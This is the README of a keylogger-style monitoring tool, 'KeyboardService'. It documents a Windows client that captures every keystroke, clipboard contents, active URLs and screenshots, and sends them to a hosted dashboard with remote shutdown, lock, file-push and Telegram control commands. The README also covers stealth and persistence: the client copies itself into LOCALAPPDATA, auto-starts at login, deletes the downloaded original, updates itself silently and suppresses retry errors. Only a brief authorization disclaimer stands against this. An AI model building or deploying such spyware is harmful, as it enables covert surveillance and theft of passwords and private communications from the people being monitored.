# KeyboardService

KeyboardService is a Python web service and desktop client. The client collects typed text, groups it into messages, and sends each message to the web service. The web page displays messages live and shows the device number that sent each one.

Only run the client on computers and accounts you own or are explicitly authorized to monitor.

## How It Works

```text
Keyboard input -> KeyboardService.exe -> POST /api/messages -> app.py -> index.html
```

Each message contains filtered `text`, the original `raw_text`, `device_id`, `device_name`, and `is_pasted`. When typing in a supported browser, the client also captures the exact active page URL as `source_url`; the filtered feed shows that URL with a link-copy button. Every keyboard press is also stored as a `raw_only` log record, including modifiers and non-text keys. The desktop client also records the active app and focused Windows control, keeping that destination while typing and starting a new message when focus moves to another field or app. The device number is a stable 12-character value generated from the computer name. The old separate heartbeat process is no longer used. A message is sent when Enter is pressed or after about 2.5 seconds without typing. Clipboard pastes are sent as separate messages and shown with a `Pasted` label and a different bubble color. The web feed can switch between filtered bubbles and a separate raw keyboard log, and each device is a link to its own message feed.

The dashboard includes per-device controls and an Activity view with device
telemetry, command history, application summaries, and CSV/JSON
message exports. Client controls include shutdown, logout, restart, lock,
pause, resume, and screenshot requests. Dashboard messages can include a JPEG,
PNG, GIF, or WebP image up to 10 MB, with an optional caption. Image delivery
uses the configured Supabase storage bucket and opens in the client's default
image viewer. The Send document control transfers PDF, DOCX, RTF, or UTF-8 TXT
files up to 20 MB to the selected client, where they open in the default app.
Telegram supports `/device`,
`/controls`, `/screenshot`, `/shutdown`, `/logout`, `/restart`, `/lock`,
`/pause`, and `/resume`.

## Files

- `app.py`: FastAPI web server and message API.
- `client.py`: keyboard listener and message sender.
- `index.html`: live browser feed.
- `mobile_keyboard/`: native Android and iPhone sample keyboard clients.
- `KeyboardService.spec`: PyInstaller configuration.
- `render.yaml`: Render deployment configuration.
- `text.txt`: local message log, ignored by Git.

## Run Locally

Install dependencies:

```powershell
python -m pip install -r requirements.txt
```

Start the website:

```powershell
python app.py
```

Open `http://127.0.0.1:8000`, then start the client in another PowerShell window:

```powershell
python client.py
```

Type a message and press Enter. It should appear in the browser.

## Deploy to Render

1. Push the project to GitHub. `text.txt` is ignored by `.gitignore`.
2. Create a Render Web Service from the repository and use the Blueprint file.
3. Render reads `render.yaml`, creates all environment-variable fields, and uses:
   - Build: `pip install -r requirements.txt`
   - Start: `gunicorn -k uvicorn.workers.UvicornWorker app:app --bind 0.0.0.0:$PORT`
4. Open the Render service URL in a browser.

After deploying the control and activity features, run the committed
[migrations/000_all.sql](migrations/000_all.sql) in the Supabase SQL Editor so
the `device_commands` and `audit_events` tables exist. Rebuild and
reinstall the desktop client from the updated `client.py`; older clients keep
the original controls but cannot acknowledge commands or use pause, resume,
restart, lock, or open dashboard image and document attachments.

Make sure the deployed service contains the latest `app.py` and `web/` files.

### Render Environment Variables

The `render.yaml` Blueprint creates every field below with `sync: false`. Paste
or generate the values in Render under **Environment**; secret values are never
stored in this repository.

Required:

```text
DATABASE_URL              # Supabase PostgreSQL connection string
SUPABASE_URL              # https://<project-ref>.supabase.co
SUPABASE_SERVICE_ROLE_KEY # Supabase server-only service-role key
INGEST_API_KEY            # shared secret for desktop client requests
APP_USERNAME              # dashboard login username
APP_PASSWORD              # dashboard login password
APP_SESSION_SECRET        # long random session-signing secret
SITE_URL=https://dablop.onrender.com # public Render URL used by desktop clients
TELEGRAM_BOT_TOKEN        # Telegram bot token
TELEGRAM_CHAT_ID          # Telegram destination chat ID
TELEGRAM_UPTIME_INTERVAL_SECONDS # uptime notification interval, minimum 60
BUY_ME_A_COFFEE_URL       # support link
MONITORED_APP_PATTERNS    # comma-separated monitored app patterns
MONITORED_SITE_PATTERNS   # comma-separated monitored site patterns
```

Never put `SUPABASE_SERVICE_ROLE_KEY`, passwords, or session secrets in the
desktop client, browser code, or a committed `.env` file.

## Configure Telegram Uptime Notifications

Create a Telegram bot with BotFather, then send it a message from the chat where
you want uptime notifications. Retrieve that chat's numeric ID and add these
secret environment variables in Render:

```text
TELEGRAM_BOT_TOKEN=your-bot-token
TELEGRAM_CHAT_ID=your-chat-id
BUY_ME_A_COFFEE_URL=https://buymeacoffee.com/yourusername
```

The service sends an online notification at startup and a health heartbeat
using `TELEGRAM_UPTIME_INTERVAL_SECONDS`, which must be at least 60. Repeated
online notifications indicate that the Render
process is restarting; check the service event and error logs in Render.

The Telegram bot menu includes `/start`, `/help`, `/status`, `/devices`,
`/messages`, `/setsite`, and `/support`. `/uptime` remains an alias for `/status`, and
`/buymeacoffee` remains an alias for `/support`. `/status` reports service
health and uptime, `/devices` lists device names, IDs, online state, and last
seen time, and `/messages` reports stored-message totals by device without
sending captured message contents to Telegram. Set
`BUY_ME_A_COFFEE_URL` to your real support page before deploying. The web link
and Telegram command use that same URL. For multiple support methods, use the
same variable with semicolon-separated `name=value` entries:

To change the Render URL used by connected desktop clients, send this command
from the configured Telegram chat:

```text
/setsite https://your-new-service.onrender.com
```

Clients receive the new URL on their next heartbeat and save it locally. The
URL setting is stored in Supabase by the private database schema, so apply
that schema before using `/setsite`.

```text
BUY_ME_A_COFFEE_URL=M-Pesa=0712345678;OKX USDT=your-okx-wallet;Binance USDT=your-binance-wallet
```

Each configured method appears in the support list with a copy button.

When device presence tracking is enabled, Telegram also reports device online
and offline transitions. These alerts include only the device name and ID, not
captured message contents.

For alerts when the service is completely unreachable, configure an external
uptime monitor to check `/health`; a stopped service cannot send its own Telegram
message.

## Configure Supabase Storage

Create a free Supabase project and run this in the Supabase SQL Editor:

For a complete setup, run [migrations/000_all.sql](migrations/000_all.sql) once.
It is safe to run against a project that already has these tables and preserves
existing message, device, and history rows.

```sql
create table public.messages (
   id bigint primary key,
   text text not null,
   device_id text not null default 'unknown',
   device_name text not null default 'Unknown device',
   app_name text not null default 'Unknown app',
   time bigint not null,
   is_pasted boolean not null default false,
   created_at timestamptz not null default now()
);

create index messages_time_idx on public.messages (time desc);
```

If the table already exists, add the new column once:

```sql
alter table public.messages
add column if not exists app_name text not null default 'Unknown app';

alter table public.messages
add column if not exists is_pasted boolean not null default false;

alter table public.messages
add column if not exists is_copied boolean not null default false;

alter table public.messages
add column if not exists raw_text text not null default '';

alter table public.messages
add column if not exists raw_only boolean not null default false;

alter table public.messages
add column if not exists source_url text not null default '';

update public.messages
set raw_text = text
where raw_text = '';
```

The consolidated [migrations/000_all.sql](migrations/000_all.sql) includes raw messages, source URLs, screenshots, and remote logs. Add `SUPABASE_URL` and `SUPABASE_SERVICE_ROLE_KEY` to Render; screenshots are stored in the private `screenshots` bucket and metadata is stored in `public.screenshots`.

The Render environment must also contain `DATABASE_URL`, `SUPABASE_URL`, and
`SUPABASE_SERVICE_ROLE_KEY`. The service role key is server-only and must not be
placed in the desktop client or web page.

The desktop client groups raw keyboard events into ten-second gzip-compressed
batches with millisecond timestamps, device ID, application name, and session ID.
Failed batch uploads are retained locally in
`%LOCALAPPDATA%\KeyboardService\pending_raw_batches.json` until the server
accepts them. The filtered `messages` table no longer receives new per-key raw
rows.

The desktop client records `Ctrl+C` as a separate copied message and `Ctrl+V`
as a pasted message. The web feed uses different bubble styles for each.

Copy the Supabase PostgreSQL connection string into Render as the secret environment variable:

```text
DATABASE_URL=your-supabase-connection-string
```

When `DATABASE_URL` is set, the server loads and saves messages in Supabase. Without it, local development uses `text.txt` as a fallback.

## Run the Packaged Client

Use the exact URL shown by Render:

```powershell
./dist/KeyboardService.exe
```

The Render URL is embedded in the executable, so no `.env` file or terminal variables are required.

Windows browsers do not allow a website to silently launch a downloaded
executable. Open `KeyboardService.exe` once after downloading it; the client registers
itself to launch automatically when you sign in to Windows from then on. On its
first run, the packaged client copies itself to
`%LOCALAPPDATA%\KeyboardService\updates\<version>\<id>\KeyboardService.exe`,
starts that versioned copy, and registers it for future logins. The downloaded
file only needs to be opened once; it is removed after the installed copy
starts. Opening a newer download registers its versioned copy without replacing
an executable that may still be running.

The installed client checks the latest GitHub release in the background after
startup. When a newer release is available, it downloads the
`KeyboardService.exe` asset into a unique versioned folder, verifies GitHub's
SHA-256 digest, and starts it from there. Windows startup is switched to the
new version without replacing the currently running executable. Network
failures leave the current version running. Before publishing a new release,
use `build_client.ps1`; it increments the client patch version, rebuilds the
executable, and produces the exact asset name `KeyboardService.exe`.

## Build the Executable

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy RemoteSigned
.\build_client.ps1
```

Output: `dist/KeyboardService.exe`

## Troubleshooting

If the website is live but empty, check the client URL:

```powershell
echo $env:KEY_FEED_URL
```

It must be `https://dablop.onrender.com`. Also check
`https://dablop.onrender.com/health`; it should return JSON containing `"ok": true`.
Restart the client, type a message, and press Enter.

The service keeps the latest 200 messages in memory. Configure Supabase as described above so messages survive Render restarts and redeploys. `text.txt` is only the local fallback and is ignored by Git.

## Configure Device Presence

Run this SQL in Supabase to retain every client that has started and its latest
heartbeat:

```sql
create table public.devices (
   device_id text primary key,
   device_name text not null default 'Unknown device',
   last_seen bigint not null,
   started_at bigint not null,
   joined_at bigint not null default (extract(epoch from now()) * 1000)::bigint
);

create index devices_last_seen_idx on public.devices (last_seen desc);
```

If the `devices` table already exists, add the permanent first-joined date:

```sql
alter table public.devices
add column if not exists joined_at bigint;

update public.devices d
set joined_at = coalesce(
   (select min(m.time) from public.messages m where m.device_id = d.device_id),
   d.started_at
)
where d.joined_at is null;

alter table public.devices
alter column joined_at set not null;
```

The desktop client sends a heartbeat every 30 seconds. It also marks itself
offline when it exits gracefully, so the service does not wait for the 90
second heartbeat timeout. `GET /api/devices` returns all known devices with
`online: true` when the client is active and its last heartbeat was within 90
seconds, plus `uptime_seconds` for each client's current session and `joined_at`
for the first recorded registration. Offline devices retain the uptime from
their last session.

If an upload fails, the desktop client stores it in
`%LOCALAPPDATA%\KeyboardService\pending_messages.json` and retries it every 30
seconds without printing retry errors on the PC. After a retry succeeds, the
server sends Telegram a notification containing only the device name and ID.
The file is removed after all pending messages are accepted.

## API Endpoints

- `GET /`: web feed.
- `GET /messages`: stored messages; pass `device_id` to select one device.
- `GET /events`: live Server-Sent Events stream.
- `POST /api/messages`: accepts `text`, optional `raw_text` and `raw_only`, `device_id`, `device_name`, `app_name`, and `is_pasted`.
- `POST /api/raw-batches`: stores a compressed raw-event batch in Supabase.
- `GET /api/raw-history`: returns raw batches filtered by device, session, and time range.
- `GET /api/devices`: devices that have sent messages.
- `POST /api/devices/heartbeat`: registers a client and updates its presence.
- `POST /api/devices/offline`: marks a client offline on graceful shutdown.
- `GET /health`: service status and message count.